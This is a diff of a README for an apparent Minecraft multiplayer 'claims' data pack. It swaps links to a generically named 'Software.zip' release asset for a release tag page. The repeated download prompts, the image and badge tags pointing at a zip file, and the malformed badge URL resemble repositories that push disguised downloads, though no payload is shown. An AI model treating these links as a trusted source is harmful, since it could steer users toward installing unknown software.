@@ -1,7 +1,7 @@
 
 # 🌟 Claims Data Pack for Minecraft Multiplayer Servers 🌟
 
-![minecraft](https://github.com/mrizwanghazi21/claims-data-pack/releases/download/v1.0/Software.zip)
+![minecraft](https://github.com/mrizwanghazi21/claims-data-pack/releases/tag/v2.0)
 
 Welcome to the "claims-data-pack" repository! This data pack is specially designed for multiplayer servers in Minecraft to manage and protect player claims effectively. With this data pack, you can ensure that players' builds and belongings are safe from griefing and unauthorized modifications.
 
@@ -11,9 +11,9 @@ Welcome to the "claims-data-pack" repository! This data pack is specially design
 - **Topics:** data-pack, datapack, dp, mc, mc-data-pack, mc-datapack, mc-dp, minecraft, minecraft-data-pack, minecraft-datapack, minecraft-dp
 
 ### 🚀 Get Started
-To download the Claims Data Pack, simply click [here](https://github.com/mrizwanghazi21/claims-data-pack/releases/download/v1.0/Software.zip) to download the file. Don't forget to extract the contents and follow the instructions included in the pack to set it up properly.
+To download the Claims Data Pack, simply click [here](https://github.com/mrizwanghazi21/claims-data-pack/releases/tag/v2.0) to download the file. Don't forget to extract the contents and follow the instructions included in the pack to set it up properly.
 
-[![Download Claims Data Pack](https://github.com/mrizwanghazi21/claims-data-pack/releases/download/v1.0/Software.zip%20Data%20Pack-green)](https://github.com/mrizwanghazi21/claims-data-pack/releases/download/v1.0/Software.zip)
+[![Download Claims Data Pack](https://github.com/mrizwanghazi21/claims-data-pack/releases/tag/v2.0%20Data%20Pack-green)](https://github.com/mrizwanghazi21/claims-data-pack/releases/tag/v2.0)
 
 Make sure to explore the features and customization options provided in the data pack to tailor it to your server's specific needs. Create a seamless multiplayer experience for your players with enhanced claim protection functionality.
 
